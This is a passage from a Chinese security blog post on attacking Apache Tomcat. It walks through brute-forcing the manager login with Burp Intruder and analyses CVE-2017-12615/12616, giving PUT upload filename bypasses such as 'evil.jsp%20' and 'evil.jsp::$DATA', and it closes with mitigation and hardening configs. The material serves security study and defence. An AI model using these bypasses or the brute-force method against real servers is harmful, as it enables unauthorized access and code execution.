+<h2 id="0x02-tomcat爆破"><a href="#0x02-tomcat爆破" class="headerlink" title="0x02 tomcat爆破"></a>0x02 tomcat爆破</h2><p>在渗透测试中，我们经常遇到tomcat后台被默认部署在外部的情况，类似于<code>http://192.168.3.204:8080/host-manager/html</code></p>
+<p>在这种情况下，我们都会选择去爆破来进入后台部署shell。</p>
+<p>先抓取一下我们的登录包：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">GET /host-manager/html HTTP/1.1</span><br><span class="line">Host: 192.168.3.204:8080</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64; rv:54.0) Gecko/20100101 Firefox/54.0 FirePHP/0.7.4</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">DNT: 1</span><br><span class="line">x-insight: activate</span><br><span class="line">Connection: keep-alive</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Authorization: Basic YWRtaW46MTIzNDU2</span><br></pre></td></tr></table></figure>
+
+<p>在Tomcat后台登录的数据包中我们发现它会将输入的账号和密码都编码成Base64密文。</p>
+<p>格式：<code>用户名:密码</code> =&gt; <code>admin:123456</code> =&gt; <code>YWRtaW46MTIzNDU2</code></p>
+<p>这里我们可以采用Metasploit中的tomcat爆破辅助模块，当然也可以用BurpSuite来爆破：</p>
+<p>将数据包发送到Intruder模块，添加一个变量：</p>
+<p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/2017-08-17/0x06.jpg" alt="Intruder"></p>
+<p>在设置Payload的时候要使用自定义迭代器：</p>
+<p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/2017-08-17/0x07.jpg" alt="Intruder"></p>
+<p>由于登录令牌都是<code>base64</code>加密的，我们需要 <code>[用户名]:[密码]</code>这样的格式进行<code>base64encde</code>才可以发送出去，我们设置三个迭代payload分别代表：用户名、:、密码、。</p>
+<p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/2017-08-17/0x08.jpg" alt="Intruder"></p>
+<p>第一位设置用户名这类的字典，可以多个。</p>
+<p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/2017-08-17/0x09.jpg" alt="payloads"></p>
+<p>第二位设置<code>:</code>，只需要一个即可。</p>
+<p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/2017-08-17/0x10.jpg" alt="payloads"></p>
+<p>第三位设置密码，可以多个。</p>
+<p>然后设置一个编码器，选择<code>base64</code>这个函数：</p>
+<p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/2017-08-17/0x11.jpg" alt="encoder"></p>
+<p>接下来再将url编码去掉，因为在base64密文里<code>=</code>会被编码成<code>%3d</code>。</p>
+<p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/2017-08-17/0x12.jpg" alt="urldecode"></p>
+<p>设置完毕后，我们可以爆破了：</p>
+<p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/2017-08-17/0x13.jpg" alt="payloads"></p>
+<h2 id="0x03-CVE-2017-12615-CVE-2017-12616原理"><a href="#0x03-CVE-2017-12615-CVE-2017-12616原理" class="headerlink" title="0x03 CVE-2017-12615 CVE-2017-12616原理"></a>0x03 CVE-2017-12615 CVE-2017-12616原理</h2><h2 id="1-漏洞概述"><a href="#1-漏洞概述" class="headerlink" title="1. 漏洞概述"></a>1. 漏洞概述</h2><p>2017年9月19日，Apache Tomcat 官方确认并修复了两个高危漏洞，漏洞 CVE 编号:CVE-2017-12615 和 CVE-2017-12616,该漏洞受影响版本为7.0-7.80之间，官方评级为高危，在一定条件下，攻击者可以利用这两个漏洞，获取用户服务器上 JSP 文件的源代码，或是通过精心构造的攻击请求，向用户服务器上传恶意 JSP 文件，通过上传的 JSP 文件 ，可在用户服务器上执行任意代码，从而导致数据泄露或获取服务器权限，存在高安全风险</p>
+<h2 id="2-漏洞描述"><a href="#2-漏洞描述" class="headerlink" title="2.漏洞描述:"></a><strong>2.漏洞描述:</strong></h2><ul>
+<li>CVE-2017-12616：信息泄露漏洞</li>
+</ul>
+<p>当 Tomcat 中启用了 VirtualDirContext 时，攻击者将能通过发送精心构造的恶意请求，绕过设置的相关安全限制，或是获取到由 VirtualDirContext 提供支持资源服务的 JSP 源代码，从而造成代码信息泄露。</p>
+<ul>
+<li>CVE-2017-12615：远程代码执行漏洞</li>
+</ul>
+<p>当 Tomcat 运行在 Windows 操作系统时，且启用了 HTTP PUT 请求方法（例如，将 readonly 初始化参数由默认值设置为 false），攻击者将有可能可通过精心构造的攻击请求数据包向服务器上传包含任意代码的 JSP 文件，JSP文件中的恶意代码将能被服务器执行。导致服务器上的数据泄露或获取服务器权限。</p>
+<p>在一定的条件下，通过以上两个漏洞可在用户服务器上执行任意代码，从而导致数据泄露或获取服务器权限，存在高安全风险。</p>
+<h2 id="3-漏洞详细分析信息"><a href="#3-漏洞详细分析信息" class="headerlink" title="3.漏洞详细分析信息"></a>3.漏洞详细分析信息</h2><h3 id="3-1-环境搭建"><a href="#3-1-环境搭建" class="headerlink" title="3.1. 环境搭建"></a>3.1. 环境搭建</h3><p>Apache Tomcat 默认开启 PUT 方法，<code>org.apache.catalina.servlets.DefaultServlet</code>的 readonly 默认为 true，而且默认没有在 conf/web.xml 里写，需要手工添加并且改为 false，才可以测试。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;init-param&gt;</span><br><span class="line"></span><br><span class="line">            &lt;param-name&gt;readonly&lt;/param-name&gt;</span><br><span class="line"></span><br><span class="line">            &lt;param-value&gt;false&lt;/param-value&gt;</span><br><span class="line"></span><br><span class="line">&lt;/init-param&gt;</span><br></pre></td></tr></table></figure>
+
+<h3 id="3-2-原理分析"><a href="#3-2-原理分析" class="headerlink" title="3.2. 原理分析"></a>3.2. 原理分析</h3><p>本次 Apache Tomcat 两个 CVE 漏洞涉及到 DefaultServlet 和 JspServlet，DefaultServlet 的作用是处理静态文件 ，JspServlet 的作用是处理 jsp 与 jspx 文件的请求，同时 DefaultServlet 可以处理 PUT 或 DELETE 请求，以下是默认配置情况：</p>
+<p><img src="https://images.seebug.org/content/images/2017/09/26972994-af8d-4cb3-afdb-102b31656719.png-w331s" alt="img"></p>
+<p>除了 jsp 和 jspx 默认是由 <code>org.apache.jasper.servlet.JspServlet</code> 处理，其他默认都是由<code>org.apache.catalina.servlets.DefaultServlet</code> 来处理。</p>
+<p>可以看出即使设置 readonly 为 false，默认 tomcat 也不允许 PUT 上传 jsp 和 jspx 文件的，因为后端都用<code>org.apache.jasper.servlet.JspServlet</code> 来处理 jsp 或是 jspx 后缀的请求了，而 JspServlet 中没有 PUT 上传的逻辑，PUT 的代码实现只存在于 DefaultServlet 中。</p>
+<p>这个漏洞的根本是通过构造特殊后缀名，绕过了 tomcat 检测，让它用 DefaultServlet 的逻辑去处理请求，从而上传 jsp 文件。</p>
+<p>目前主要三种方法：</p>
+<ul>
+<li>evil.jsp%20</li>
+<li>evil.jsp::$DATA</li>
+<li>evil.jsp/</li>
+</ul>
+<p>利用这两种姿势 PUT 请求 tomcat 的时候，骗过 tomcat 而进入 DefaultServlet 处理的逻辑，如图:</p>
+<p><img src="https://images.seebug.org/content/images/2017/09/86bf5b30-e8e6-4485-97f2-d47963a571b7.png-w331s" alt="img"><img src="https://images.seebug.org/content/images/2017/09/5027bcec-6b1b-4cc8-8d67-806c51a2dc71.png-w331s" alt="img"><img src="https://images.seebug.org/content/images/2017/09/c2bb5fc6-45cb-4774-9a0c-25fbf17f61c6.png-w331s" alt="img"></p>
+<h3 id="3-3-调试代码"><a href="#3-3-调试代码" class="headerlink" title="3.3. 调试代码"></a>3.3. 调试代码</h3><p>调试 DefaultServlet.java 代码流程，如下:</p>
+<p><img src="https://images.seebug.org/content/images/2017/09/0f4a6dad-7363-4bbe-ae76-5ba4cc573d8d.png-w331s" alt="img"></p>
+<p>设置 readOnly 为 false</p>
+<p>先调用栈</p>
+<p><img src="https://images.seebug.org/content/images/2017/09/955cf8bf-b559-4627-bae7-2e9fb41aded8.png-w331s" alt="img"></p>
+<p>重点看 doPut，这里 tomcat 开始处理 PUT 请求，可以看到这里如果 readonly 是 true 就直接进入 error 了，所以需要设置成 false。</p>
+<p><img src="https://images.seebug.org/content/images/2017/09/f6ea75c6-60ad-4f42-a1f5-ee7c90c4df33.png-w331s" alt="img"><img src="https://images.seebug.org/content/images/2017/09/83f2866f-161c-4e62-bd20-8c8369c5fad9.png-w331s" alt="img"></p>
+<p>真正写入文件在 FileDirContext.java 的 rebind 函数里。</p>
+<p><img src="https://images.seebug.org/content/images/2017/09/1745ca74-428a-4b09-9233-85faaed1de87.png-w331s" alt="img"><img src="https://images.seebug.org/content/images/2017/09/01c719e9-fa1f-4ce6-b3da-68f0a9d3ac2b.png-w331s" alt="img"><img src="https://images.seebug.org/content/images/2017/09/e68684dc-53a6-4d13-b0ba-9e5690e95a4c.png-w331s" alt="img"><img src="https://images.seebug.org/content/images/2017/09/44367a84-4a04-4e23-9863-b444b679c1fc.png-w331s" alt="img"></p>
+<h4 id="FileOutputStream-特性"><a href="#FileOutputStream-特性" class="headerlink" title="FileOutputStream 特性"></a>FileOutputStream 特性</h4><p>上面遗留了一个问题就是当请求 <code>jsp%20</code> 或是 <code>jsp::$DATA</code> 后缀的时候，为什么最终却写入 <code>.jsp</code> 后缀的文件，这些其实是 java.io. FileOutputStream 的问题了，具体需要分析 jdk 的 C 代码才能得到解答，如图</p>
+<p><img src="https://images.seebug.org/content/images/2017/09/baa97b4d-70fb-4c19-9cb5-d8b5709a6505.png-w331s" alt="img"><img src="https://images.seebug.org/content/images/2017/09/29c3a323-0938-4a86-8264-51635ee491d5.png-w331s" alt="img"><img src="https://images.seebug.org/content/images/2017/09/dc354bdf-9f2b-46c9-b962-a9f610475e99.png-w331s" alt="img"></p>
+<p>跟到 open 是 native 的，已经不是 java 层面的问题了，这个 open 实际上是一个 jni 接口，然后调用 windowsAPI CreateFileW 创建文件，这里下载 openjdk6 的 jdk 代码分析，如图:</p>
+<p><img src="https://images.seebug.org/content/images/2017/09/e3c6580c-7754-4228-b3fd-0af9bc184e32.png-w331s" alt="img"></p>
+<p>这里 <code>Java_java_io_FileOutputStream_open</code> 便是上边 java 代码里 open 函数的C代码实现，其中参数 path 对应 open 函数的 name 变量，继续跟踪，如图:</p>
+<p><img src="https://images.seebug.org/content/images/2017/09/dc52a5b4-e969-4ef5-b44a-016206cd2e77.png-w331s" alt="img"></p>
+<p>继续跟入 winFileHandleOpen，这里最终是调用 windows 的 CreateFileW 实现文件创建，如图：</p>
+<p><img src="https://images.seebug.org/content/images/2017/09/45fbcc41-db75-4f26-b04f-00853ae7c685.png-w331s" alt="img"></p>
+<p>而在 windows 下，创建文件是对后缀名称有要求的，例如：如果后缀末尾是空格，会被去掉，<code>a.txt::$DATA</code>传入 CreateFileW 也会被处理成 <code>a.txt</code></p>
+<h4 id="java-io-File-的特性"><a href="#java-io-File-的特性" class="headerlink" title="java.io.File 的特性"></a>java.io.File 的特性</h4><p>前面没有说<code>evil.jsp/</code>，这种方法也可以 PUT 上传，但是不同于上面两种，这种方法是利用了 File 类的特性，先看代码，如图:</p>
+<p><img src="https://images.seebug.org/content/images/2017/09/92a8f30b-6e18-4b45-be6c-3aba3f2ca733.png-w331s" alt="img"><img src="https://images.seebug.org/content/images/2017/09/8e30c16d-793f-434e-979a-05352a2a60f0.png-w331s" alt="img"></p>
+<p>这里测试发现 java.io.File 会过滤掉子文件名末尾的斜杠，写一个测试用例确实是这样的，如图:</p>
+<p><img src="https://images.seebug.org/content/images/2017/09/5168cf39-b6c2-4f5b-89ea-4d3a2df2c196.png-w331s" alt="img"></p>
+<p>具体跟踪一下代码，如图:</p>
+<p><img src="https://images.seebug.org/content/images/2017/09/ff96b625-8c2c-47cb-b628-c42d5bcf3b88.png-w331s" alt="img"></p>
+<p>继续跟入，如图:</p>
+<p><img src="https://images.seebug.org/content/images/2017/09/b2183a3f-4713-4fdc-a49a-a2b8bfa5f592.png-w331s" alt="img"></p>
+<p>在这里这个 <code>normalize(path, n, (prev == slash) ? i - 1 : i)</code> 会将文件名末尾的/过滤掉，所以可以导致后面文件写入 jsp 文件。</p>
+<h3 id="3-4-漏洞复现"><a href="#3-4-漏洞复现" class="headerlink" title="3.4. 漏洞复现"></a>3.4. 漏洞复现</h3><p>Apache Tomcat 7 默认值是 true，在默认条件下，无法成功利用这两个漏洞。为了触发漏洞，需要在 conf/web.xml 中 defaultservlet 的配置中手工添加如下配置：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;init-param&gt;</span><br><span class="line"></span><br><span class="line">            &lt;param-name&gt;readonly&lt;/param-name&gt;</span><br><span class="line"></span><br><span class="line">            &lt;param-value&gt;false&lt;/param-value&gt;</span><br><span class="line"></span><br><span class="line">&lt;/init-param&gt;</span><br></pre></td></tr></table></figure>
+
+<p>我们通过构造的请求上传 b.jsp，执行该请求请求就会由 DefaultServlet 处理，从而PUT操作就会顺利执行，成功上传文件，以下通过构造请求，触发并复现该漏洞：</p>
+<p><img src="https://images.seebug.org/content/images/2017/09/dc1973dc-889e-4123-8e64-f95a29e291f1.png-w331s" alt="img"></p>
+<p>在分析的时候，我们也发现 File 类存在一个利用点，normalize 函数过滤掉了末尾斜杠。我们通过构造请求测试，发现可以被利用，通过对全版本测试，发现 Windows、Linux、Unix 下的 Apache Tomcat 5.X、6.X、7.x、8.x、9.x 版本均受到影响，从这点可以看出官方给出的补丁存在绕过，目前该问题已经得到 Apache 官方的确认。</p>
+<p><img src="https://images.seebug.org/content/images/2017/09/aadd158a-6495-426e-ab2c-55dc0b469c1d.png-w331s" alt="img"></p>
+<p><img src="https://images.seebug.org/content/images/2017/09/fe05886e-684c-47d4-85d6-98eb561c5abe.png-w331s" alt="img"></p>
+<h2 id="4-漏洞分析总结"><a href="#4-漏洞分析总结" class="headerlink" title="4. 漏洞分析总结"></a>4. 漏洞分析总结</h2><p>从以上分析可以得出，该漏洞利用的前提条件需要手动开启 readOnly 功能，以支持上传操作，在 Apache tomcat 7.X 版本默认配置的情况下是无法成功利用漏洞，从实际测试来看，漏洞危害性并没有那么高。</p>
+<p>但是如果用户一旦启用了 readOnly 功能，黑客可利用漏洞成功入侵。</p>
+<h2 id="5-如何检测漏洞？"><a href="#5-如何检测漏洞？" class="headerlink" title="5. 如何检测漏洞？"></a>5. 如何检测漏洞？</h2><p>从以上分析可以得出，该漏洞利用的前提条件需要手动开启 readOnly 功能，开发或运维人员可以排查是否启用了 PUT 方法并开启了 readOnly 功能。</p>
+<h2 id="6-如何应对漏洞？"><a href="#6-如何应对漏洞？" class="headerlink" title="6. 如何应对漏洞？"></a>6. 如何应对漏洞？</h2><ol>
+<li>根据业务评估配置 conf/webxml 文件的 readOnly 值为 Ture 或注释参数，禁用 PUT 方法并重启 tomcat 服务，临时规避安全风险； 注意： 如果禁用 PUT 方法，对于依赖PUT方法的应用，可能导致业务失效。</li>
+<li>目前官方已经发布了 7.0.81 版本修复了两个漏洞，建议用户尽快升级到最新版本；</li>
+<li>对于最新版本绕过的问题，建议用户持续关注官方信息，及时更新到最新版本；</li>
+<li>可以选用阿里云云盾WAF产品进行防御。</li>
+<li>未使用WAF前：<img src="https://images.seebug.org/content/images/2017/09/ac332dd3-f17c-46ce-917f-89b4a2f66c95.png-w331s" alt="img"></li>
+</ol>
+<p>Figure 1成功上传文件</p>
+<ul>
+<li>使用WAF后的防御效果：<img src="https://images.seebug.org/content/images/2017/09/19a4be4d-298d-4b02-b5d0-7b9fbbbc3d5e.png-w331s" alt="img"></li>
+</ul>
+<p>Figure 2上传文件时报405，上传文件失败</p>
+<h2 id="7-Web安全最佳实践"><a href="#7-Web安全最佳实践" class="headerlink" title="7. Web安全最佳实践"></a>7. Web安全最佳实践</h2><p><strong>为什么PUT方法不安全?</strong></p>
+<p>除标准常用的 GET 和 POST 方法外，HTTP 请求还使用其他各种方法，PUT 方法是 HTTP 请求方法中的一种。此方法用于请求服务器把请求中的实体储存在请求资源下，如果请求资源已经在服务器中存在，那么将会用此请求中的数据替换原先的数据，作为指定资源的最新修改版。如果请求指定的资源不存在，将会创建这个资源，且数据位请求正文。</p>
+<p>在以往的实际安全事件案例中，我们可以看到，由于 PUT 方法自身不带验证机制，有很多利用PUT方法很快捷简单的成功入侵服务器，上传 Webshell 或其他恶意文件，从而获取敏感数据或服务器权限，从 web 安全年最佳实践来看，我们不推荐使用这些不安全的 http OPTIONS 方法。</p>
+<p>从安全最佳实践来说，我们应该遵循“最小化”原则，不要随意开启不必要的服务或方法，仅开启必要的功能，减小风险暴露面，从而降低安全风险，保障业务的安全性。</p>
+<p><strong>最佳实践：如何知道自己网站使用了哪些http方法？</strong></p>
+<p><img src="https://images.seebug.org/content/images/2017/09/0d6bf6c4-30e4-491c-9f88-90423a162337.png-w331s" alt="img"></p>
+<p>查看响应的 Allow: GET, HEAD, POST, OPTIONS,TRACE</p>
+<p>注：该测试仅限于自身业务。</p>
+<p><strong>禁用不必要的 http 方法</strong></p>
+<ul>
+<li>IIS：</li>
+</ul>
+<p>IIS 默认拒绝 PUT 和 DELETE 请求，如果使用了不安全的方法，建议禁用 webDAV 模块。</p>
+<p><img src="https://images.seebug.org/content/images/2017/09/aa9f0b6d-80ef-4831-9d5e-7b2738948467.png-w331s" alt="img"></p>
+<ul>
+<li>Apache:</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;Location /&gt;</span><br><span class="line"></span><br><span class="line">仅允许GET和POST方法，修改后重启服务。</span><br><span class="line"></span><br><span class="line">&lt;LimitExcept GET POST &gt;</span><br><span class="line"></span><br><span class="line">  Order Allow,Deny</span><br><span class="line"></span><br><span class="line">  Deny from all</span><br><span class="line"></span><br><span class="line">&lt;/LimitExcept&gt;</span><br><span class="line"></span><br><span class="line">&lt;/Location&gt;</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>Tomcat：</li>
+</ul>
+<p>修改web.xml配置，增加以下内容，并重启tomcat服务：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">&lt;security-constraint&gt;</span><br><span class="line"></span><br><span class="line">   &lt;web-resource-collection&gt;</span><br><span class="line"></span><br><span class="line">      &lt;url-pattern&gt;/*&lt;/url-pattern&gt;</span><br><span class="line"></span><br><span class="line">      &lt;http-method&gt;PUT&lt;/http-method&gt;</span><br><span class="line"></span><br><span class="line">&lt;http-method&gt;DELETE&lt;/http-method&gt;</span><br><span class="line"></span><br><span class="line">&lt;http-method&gt;HEAD&lt;/http-method&gt;</span><br><span class="line"></span><br><span class="line">&lt;http-method&gt;OPTIONS&lt;/http-method&gt;</span><br><span class="line"></span><br><span class="line">&lt;http-method&gt;TRACE&lt;/http-method&gt;</span><br><span class="line"></span><br><span class="line">   &lt;/web-resource-collection&gt;</span><br><span class="line"></span><br><span class="line">   &lt;auth-constraint&gt;</span><br><span class="line"></span><br><span class="line">   &lt;/auth-constraint&gt;</span><br><span class="line"></span><br><span class="line"> &lt;/security-constraint&gt;</span><br><span class="line"></span><br><span class="line"> &lt;login-config&gt;</span><br><span class="line"></span><br><span class="line">   &lt;auth-method&gt;BASIC&lt;/auth-method&gt;</span><br><span class="line"></span><br><span class="line"> &lt;/login-config&gt;</span><br></pre></td></tr></table></figure>
+
+<p>翻译文章：<a href="https://www.hackingarticles.in/" target="_blank" rel="noopener">https://www.hackingarticles.in/</a></p>
+<p>tomcat漏洞：</p>
+<p><a href="https://www.bodkin.ren/index.php/archives/27/" target="_blank" rel="noopener">https://www.bodkin.ren/index.php/archives/27/</a></p>
+<p><a href="http://payloads.online/archivers/2017-08-17/2" target="_blank" rel="noopener">倾旋的文章</a></p>
+<p><a href="http://www.4hou.com/vulnerable/7743.html" target="_blank" rel="noopener">Apache Tomcat RCE（CVE-2017-12615 ）</a></p>
+<p><a href="https://paper.seebug.org/399/#34" target="_blank" rel="noopener">知道创宇404实验室</a></p>
+<p><a href="http://www.moonsec.com/post-446.html" target="_blank" rel="noopener">session操纵</a> <a href="https://www.secpulse.com/archives/21881.html" target="_blank" rel="noopener">https://www.secpulse.com/archives/21881.html</a> &lt;<a href="http://blog.51cto.com/chenjc/1434858" target="_blank" rel="noopener">http://blog.51cto.com/chenjc/1434858</a></p>
+
+    </div>
+
+    
+    
+    
+
+    <div>
+    
+    <div>
+    
+        <div style="text-align:center;color: #ccc;font-size:14px;">-------------本文结束<i class="fa fa-paw"></i>感谢您的阅读-------------</div>
+    
+</div>
+
+    
+    </div>
+      <div>
+        
+
+<ul class="post-copyright">
+  <li class="post-copyright-author">
+    <strong>本文作者： </strong>Wh0ale</li>
+  <li class="post-copyright-link">
+    <strong>本文链接：</strong>
+    <a href="https://wh0ale.github.io/2018/12/23/2018-12-23-利用Tomcat Manager的多种方法/" title="利用Tomcat Manager的多种方法">https://wh0ale.github.io/2018/12/23/2018-12-23-利用Tomcat Manager的多种方法/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/zh-Hans" rel="noopener" target="_blank"><i class="fa fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！</li>
+</ul>
+
+      </div>
+
+    <footer class="post-footer">
+          
+        
+        <div class="post-tags">
+            <a href="/tags/Hackthebox/" rel="tag"><i class="fa fa-tag"></i># Hackthebox</a>
+          
+        </div>
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+              <a href="/2018/12/23/2018-12-23-hackthebox匿名登录/" rel="next" title="Hackthebox 匿名登录">
+                <i class="fa fa-chevron-left"></i> Hackthebox 匿名登录
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+              <a href="/2018/12/23/2018-12-23-利用PUT方法的多种方法/" rel="prev" title="利用PUT方法的多种方法">
+                利用PUT方法的多种方法 <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+  </div>
+
+
+          </div>
+          
+    
+    <div class="comments" id="gitalk-container"></div>
+  
+
+
+        </div>
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    <div class="sidebar-inner">
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image"
+      src="/images/avatar.gif"
+      alt="Wh0ale">
+  <p class="site-author-name" itemprop="name">Wh0ale</p>
+  <div class="site-description motion-element" itemprop="description">No master and rookie，only hardworking and lazy.</div>
+</div>
+  <nav class="site-state motion-element">
+      <div class="site-state-item site-state-posts">
+        
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">123</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+    
+      
+      
+      <div class="site-state-item site-state-tags">
+        
+          
+            <a href="/tags/">
+          
+        
+        
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+        <span class="site-state-item-count">59</span>
+        <span class="site-state-item-name">标签</span>
+        </a>
+      </div>
+    
+  </nav>
+  <div class="feed-link motion-element">
+    <a href="/atom.xml" rel="alternate">
+      <i class="fa fa-rss"></i>RSS
+    </a>
+  </div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+      
+      
+        
+      
+      
+        
+      
+        <a href="https://github.com/Wh0ale" title="GitHub &rarr; https://github.com/Wh0ale" rel="noopener" target="_blank"><i class="fa fa-fw fa-github"></i>GitHub</a>
+      </span>
+    
+      <span class="links-of-author-item">
+      
+      
+        
+      
+      
+        
+      
+        <a href="https://medium.com/@Wh0ale" title="Medium &rarr; https://medium.com/@Wh0ale" rel="noopener" target="_blank"><i class="fa fa-fw fa-medium"></i>Medium</a>
+      </span>
+    
+      <span class="links-of-author-item">
+      
+      
+        
+      
+      
+        
+      
+        <a href="/AttackerWh0ale@gmail.com" title="Mail &rarr; AttackerWh0ale@gmail.com"><i class="fa fa-fw fa-envelope"></i>Mail</a>
+      </span>
+    
+      <span class="links-of-author-item">
+      
+      
+        
+      
+      
+        
+      
+        <a href="https://twitter.com/Wh0ale" title="Twitter &rarr; https://twitter.com/Wh0ale" rel="noopener" target="_blank"><i class="fa fa-fw fa-twitter"></i>Twitter</a>
+      </span>
+    
+  </div>
+  <div class="cc-license motion-element" itemprop="license">
+    
+  
+    <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/zh-Hans" class="cc-opacity" rel="noopener" target="_blank"><img src="/images/cc-by-nc-sa.svg" alt="Creative Commons"></a>
+  </div>
+
+
+
+        </div>
+      </div>
+      <!--noindex-->
+        <div class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+            
+            
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#0x01-流程"><span class="nav-number">1.</span> <span class="nav-text">0x01 流程</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#1-Tomcat-Manager经过身份验证的上载代码执行"><span class="nav-number">1.1.</span> <span class="nav-text">1.Tomcat Manager经过身份验证的上载代码执行</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#2-生成-war格式后门"><span class="nav-number">1.2.</span> <span class="nav-text">2.生成.war格式后门</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#3-Tomcat-War-Deployer-Script"><span class="nav-number">1.3.</span> <span class="nav-text">3.Tomcat War Deployer Script</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#4-生成JSP-Webshell"><span class="nav-number">1.4.</span> <span class="nav-text">4.生成JSP Webshell</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x02-tomcat爆破"><span class="nav-number">1.5.</span> <span class="nav-text">0x02 tomcat爆破</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x03-CVE-2017-12615-CVE-2017-12616原理"><span class="nav-number">1.6.</span> <span class="nav-text">0x03 CVE-2017-12615 CVE-2017-12616原理</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#1-漏洞概述"><span class="nav-number">1.7.</span> <span class="nav-text">1. 漏洞概述</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#2-漏洞描述"><span class="nav-number">1.8.</span> <span class="nav-text">2.漏洞描述:</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#3-漏洞详细分析信息"><span class="nav-number">1.9.</span> <span class="nav-text">3.漏洞详细分析信息</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#3-1-环境搭建"><span 